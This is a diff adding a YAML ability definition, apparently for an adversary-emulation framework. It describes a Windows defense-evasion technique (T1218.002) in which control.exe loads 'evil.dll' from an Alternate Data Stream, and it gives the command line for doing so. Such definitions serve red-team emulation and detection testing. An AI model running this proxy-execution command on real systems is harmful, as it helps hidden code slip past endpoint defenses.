@@ -1,0 +1,22 @@
+- id: 17aebe86-a11c-5faf-8c53-bee5a1b59d4f
+  name: Control.exe - Execute evil.dll which is stored in an Alternate Data Stream
+    (ADS).
+  description: Execute evil.dll which is stored in an Alternate Data Stream (ADS).
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.002
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'control.exe #{host.dir.temp}:evil.dll'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
